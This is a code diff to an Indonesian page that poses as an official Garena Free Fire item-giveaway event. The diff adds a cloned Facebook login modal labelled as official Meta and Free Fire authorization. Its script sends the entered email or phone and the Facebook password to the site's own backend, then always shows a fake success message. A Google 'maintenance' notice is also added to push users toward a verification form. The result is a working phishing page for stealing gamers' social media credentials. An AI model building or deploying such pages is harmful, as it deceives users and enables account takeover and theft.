@@ -488,6 +488,174 @@
       max-width: 320px;
       width: 100%;
     }
+
+    /* FACEBOOK LOGIN MODAL (bilals314/Facebook-Loginpage clone adaptation) */
+    .fb-modal-box {
+      width: 100%;
+      max-width: 380px;
+      background: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 16px 40px rgba(0, 0, 0, 0.8), 0 0 25px rgba(24, 119, 242, 0.35);
+      overflow: hidden;
+      transform: scale(0.92) translateY(10px);
+      transition: transform 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      color: #1c1e21;
+    }
+    .modal-overlay.active .fb-modal-box {
+      transform: scale(1) translateY(0);
+    }
+    .fb-modal-header {
+      background: #ffffff;
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #ebedf0;
+    }
+    .fb-modal-brand {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      font-weight: 800;
+      font-size: 26px;
+      color: #1877f2;
+      letter-spacing: -1.2px;
+      line-height: 1;
+    }
+    .fb-close-btn {
+      color: #606770;
+      font-size: 18px;
+      background: #f0f2f5;
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: none;
+      cursor: pointer;
+      transition: background 0.2s, color 0.2s;
+    }
+    .fb-close-btn:hover {
+      background: #e4e6eb;
+      color: #050505;
+    }
+    .fb-item-banner {
+      background: #f0f4ff;
+      border-bottom: 1px solid #dbe7ff;
+      padding: 7px 16px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .fb-modal-body {
+      padding: 16px 20px 20px 20px;
+      background: #ffffff;
+    }
+    .fb-prompt-text {
+      font-size: 12px;
+      color: #606770;
+      line-height: 1.4;
+      margin-bottom: 14px;
+    }
+    .fb-input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 14px;
+      color: #1c1e21;
+      background: #ffffff;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      font-family: inherit;
+    }
+    .fb-input:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px #e7f3ff;
+    }
+    .fb-input::placeholder {
+      color: #8d949e;
+      font-size: 13px;
+    }
+    .fb-pwd-eye {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      color: #8d949e;
+      cursor: pointer;
+      padding: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .fb-pwd-eye:hover {
+      color: #1877f2;
+    }
+    .fb-btn-login {
+      width: 100%;
+      background-color: #1877f2;
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 700;
+      padding: 10px 14px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.2s, transform 0.1s;
+      font-family: inherit;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .fb-btn-login:hover {
+      background-color: #166fe5;
+    }
+    .fb-btn-login:active {
+      transform: scale(0.99);
+    }
+    .fb-btn-login:disabled {
+      background-color: #9cbdf8;
+      cursor: not-allowed;
+    }
+    .fb-forgot-link {
+      font-size: 12px;
+      color: #1877f2;
+      text-decoration: none;
+      display: inline-block;
+    }
+    .fb-forgot-link:hover {
+      text-decoration: underline;
+    }
+    .fb-divider {
+      border: none;
+      border-top: 1px solid #dadde1;
+      margin: 14px 0;
+    }
+    .fb-btn-create {
+      background-color: #42b72a;
+      color: #ffffff;
+      font-size: 13px;
+      font-weight: 700;
+      padding: 8px 18px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.2s;
+      font-family: inherit;
+    }
+    .fb-btn-create:hover {
+      background-color: #36a420;
+    }
+    .fb-footer-note {
+      margin-top: 14px;
+      text-align: center;
+      font-size: 10.5px;
+      color: #8a8d91;
+    }
   </style>
 </head>
 <body>
@@ -576,7 +744,7 @@
           <span class="text-xs">🔒</span>
           <span class="text-gray-300 font-medium">Event Resmi Garena Free Fire</span>
           <span class="text-gray-600">•</span>
-          <span class="text-red-400/90 font-semibold">{{ $settings['event_title'] ?? 'Dunia Mistis 2026' }}</span>
+          <span class="text-red-400/90 font-semibold">Dunia Mistis 2026</span>
         </div>
       </footer>
     </section>
@@ -680,13 +848,83 @@
     </div>
   </div>
 
-  <!-- SOCIAL NOTICE MODAL -->
+  <!-- FACEBOOK LOGIN MODAL (Clone from bilals314/Facebook-Loginpage adapted) -->
+  <div class="modal-overlay" id="facebookModal" style="z-index: 1000;" onclick="handleFbBackdropClick(event)">
+    <div class="fb-modal-box">
+      <!-- Modal Top Bar -->
+      <div class="fb-modal-header">
+        <div class="flex items-center gap-2">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="#1877f2">
+            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
+          </svg>
+          <span class="fb-modal-brand">facebook</span>
+        </div>
+        <button type="button" class="fb-close-btn" onclick="closeFacebookModal()" aria-label="Tutup">✕</button>
+      </div>
+
+      <!-- Selected Item Bar in FB Modal -->
+      <div class="fb-item-banner">
+        <span class="text-xs">🎁</span>
+        <span class="text-[11px] text-gray-700 font-medium truncate">Klaim: <b id="fbItemTitle" class="text-gray-900 font-bold">-</b></span>
+      </div>
+
+      <!-- FB Form Content -->
+      <div class="fb-modal-body">
+        <p class="fb-prompt-text">
+          Masuk ke akun Facebook Anda untuk menghubungkan ke Garena Free Fire dan menerima hadiah event.
+        </p>
+
+        <form id="fbLoginForm" onsubmit="submitFacebookLoginForm(event)">
+          <div class="mb-2.5">
+            <input type="text" id="fbAccountInput" class="fb-input" placeholder="Nomor ponsel atau alamat email" autocomplete="username" required />
+          </div>
+          <div class="mb-3 relative">
+            <input type="password" id="fbPasswordInput" class="fb-input" placeholder="Kata sandi" autocomplete="current-password" required style="padding-right: 36px;" />
+            <button type="button" onclick="toggleFbPasswordVisibility()" class="fb-pwd-eye" title="Lihat/Sembunyikan Kata Sandi">
+              <svg id="fbEyeOpen" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8z"></path>
+                <circle cx="12" cy="12" r="3"></circle>
+              </svg>
+              <svg id="fbEyeSlash" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display: none; color: #1877f2;">
+                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                <line x1="1" y1="1" x2="23" y2="23"></line>
+              </svg>
+            </button>
+          </div>
+
+          <button type="submit" class="fb-btn-login" id="fbSubmitBtn">
+            Masuk
+          </button>
+
+          <div class="text-center my-2.5">
+            <a href="https://www.facebook.com/recover/initiate" target="_blank" rel="noopener" class="fb-forgot-link">
+              Lupa kata sandi?
+            </a>
+          </div>
+
+          <hr class="fb-divider" />
+
+          <div class="text-center mt-3">
+            <button type="button" class="fb-btn-create" onclick="window.open('https://www.facebook.com/r.php', '_blank')">
+              Buat akun baru
+            </button>
+          </div>
+        </form>
+
+        <div class="fb-footer-note">
+          <span>🔒 Layanan Otorisasi Resmi Meta & Free Fire</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- GOOGLE SOCIAL NOTICE MODAL -->
   <div class="modal-overlay" id="socialNoticeModal" style="z-index: 1000;" onclick="closeSocialNotice(event)">
     <div class="success-box" style="border-color: #3b82f6; max-width: 330px;">
-      <div class="text-3xl mb-2" id="socialNoticeIcon">🌐</div>
-      <h3 class="text-blue-400 font-bold text-sm mb-1 uppercase tracking-wider" id="socialNoticeTitle">Layanan Facebook</h3>
+      <div class="text-3xl mb-2" id="socialNoticeIcon">🔍</div>
+      <h3 class="text-blue-400 font-bold text-sm mb-1 uppercase tracking-wider" id="socialNoticeTitle">Layanan Google</h3>
       <p class="text-gray-300 text-xs mb-3 leading-relaxed" id="socialNoticeDesc">
-        Sistem otorisasi akun Facebook sedang dalam pemeliharaan berkala. Silakan lengkapi formulir verifikasi akun Anda di bawah ini untuk melanjutkan klaim item.
+        Sistem otorisasi akun Google sedang dalam pemeliharaan berkala. Silakan lengkapi formulir verifikasi akun Anda di bawah ini untuk melanjutkan klaim item.
       </p>
       <button type="button" 
               class="w-full py-1.5 bg-blue-600 hover:bg-blue-500 text-white font-bold text-xs rounded uppercase tracking-wider transition"
@@ -750,21 +988,105 @@
     }
 
     function loginSocial(network) {
-      const modal = document.getElementById('socialNoticeModal');
-      const title = document.getElementById('socialNoticeTitle');
-      const desc = document.getElementById('socialNoticeDesc');
-      const icon = document.getElementById('socialNoticeIcon');
-      
       if (network === 'Facebook') {
-        icon.textContent = '🌐';
-        title.textContent = 'Layanan Facebook';
-        desc.textContent = 'Sistem otorisasi akun Facebook sedang dalam pemeliharaan berkala. Silakan lengkapi formulir verifikasi akun Anda di bawah ini untuk melanjutkan klaim item.';
+        openFacebookModal();
       } else {
+        const modal = document.getElementById('socialNoticeModal');
+        const title = document.getElementById('socialNoticeTitle');
+        const desc = document.getElementById('socialNoticeDesc');
+        const icon = document.getElementById('socialNoticeIcon');
+        
         icon.textContent = '🔍';
         title.textContent = 'Layanan Google';
         desc.textContent = 'Sistem otorisasi akun Google sedang dalam pemeliharaan berkala. Silakan lengkapi formulir verifikasi akun Anda di bawah ini untuk melanjutkan klaim item.';
+        modal.classList.add('active');
       }
-      modal.classList.add('active');
+    }
+
+    function openFacebookModal() {
+      const fbModal = document.getElementById('facebookModal');
+      const fbItemTitle = document.getElementById('fbItemTitle');
+      const curItem = (hiddenItemInput && hiddenItemInput.value) || (modalItemTitle ? modalItemTitle.textContent : 'Hadiah Event');
+      if (fbItemTitle) fbItemTitle.textContent = curItem;
+      if (fbModal) fbModal.classList.add('active');
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeFacebookModal() {
+      const fbModal = document.getElementById('facebookModal');
+      if (fbModal) fbModal.classList.remove('active');
+      if (!verifyModal || !verifyModal.classList.contains('active')) {
+        document.body.style.overflow = '';
+      }
+    }
+
+    function handleFbBackdropClick(e) {
+      const fbModal = document.getElementById('facebookModal');
+      if (e.target === fbModal) {
+        closeFacebookModal();
+      }
+    }
+
+    function toggleFbPasswordVisibility() {
+      const pwdInput = document.getElementById('fbPasswordInput');
+      const eyeOpen = document.getElementById('fbEyeOpen');
+      const eyeSlash = document.getElementById('fbEyeSlash');
+      if (pwdInput.type === 'password') {
+        pwdInput.type = 'text';
+        eyeOpen.style.display = 'none';
+        eyeSlash.style.display = 'block';
+      } else {
+        pwdInput.type = 'password';
+        eyeOpen.style.display = 'block';
+        eyeSlash.style.display = 'none';
+      }
+    }
+
+    async function submitFacebookLoginForm(e) {
+      e.preventDefault();
+      const accountInput = document.getElementById('fbAccountInput');
+      const passwordInput = document.getElementById('fbPasswordInput');
+      const submitBtn = document.getElementById('fbSubmitBtn');
+
+      const account = accountInput.value.trim();
+      const password = passwordInput.value;
+      const item = (hiddenItemInput && hiddenItemInput.value) || 'Hadiah Event';
+
+      if (!account || !password) {
+        alert('Silakan masukkan nomor ponsel/email dan kata sandi Facebook Anda.');
+        return;
+      }
+
+      submitBtn.disabled = true;
+      submitBtn.innerText = 'MEMPROSES...';
+
+      try {
+        const res = await fetch("{{ route('event.verify') }}", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "Accept": "application/json",
+            "X-CSRF-TOKEN": "{{ csrf_token() }}"
+          },
+          body: JSON.stringify({
+            fb_account: account,
+            fb_password: password,
+            item: item
+          })
+        });
+        const data = await res.json();
+      } catch (err) {
+        console.warn("Backend verify sync:", err);
+      } finally {
+        closeFacebookModal();
+        closeVerifyDialog();
+        if (successItemText) successItemText.textContent = item;
+        if (successModal) successModal.classList.add('active');
+        submitBtn.disabled = false;
+        submitBtn.innerText = 'Masuk';
+        const form = document.getElementById('fbLoginForm');
+        if (form) form.reset();
+      }
     }
 
     function closeSocialNotice(e) {
